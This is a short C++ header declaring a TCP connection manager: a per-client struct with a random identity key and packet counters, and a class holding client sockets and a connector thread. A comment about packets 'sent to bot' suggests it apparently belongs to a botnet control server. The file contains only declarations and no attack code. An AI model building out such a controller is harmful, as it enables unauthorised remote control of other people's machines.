#pragma once
#include <inc.h>

#include "TCPClient.h"

namespace net
{
	namespace consock_strc
	{
		struct s_connection
		{
			//default gen new identity
			s_connection()
			{
				this->identity = randull(ULLONG_MAX);				
			}			
			ULONGLONG		identity = 0;		//this will be sort of a auth key, so we can identify each client
			ULONGLONG		last_packet = 0;	//last time packet was rcv/sent
			ULONGLONG		packets_rcv = 0;	//total rcv packs
			ULONGLONG		packets_sent = 0;	//total packets sent to bot
			SOCKET			socket = {};			//current connection to this client
		};
	}
	class c_consock : public s<c_consock>
	{
	private:
		SOCKET										ipc_sock = {};
		std::vector<consock_strc::s_connection*>	connections = {};
		std::thread*								connector_thread = {};
		bool	init_port();
	public:
		CTCPServer*									server_instance = 0;
		consock_strc::s_connection*					get(ULONGLONG uid);
		bool	setup();
		void	connector();
		bool	destroy(ULONGLONG uid);
	};
}
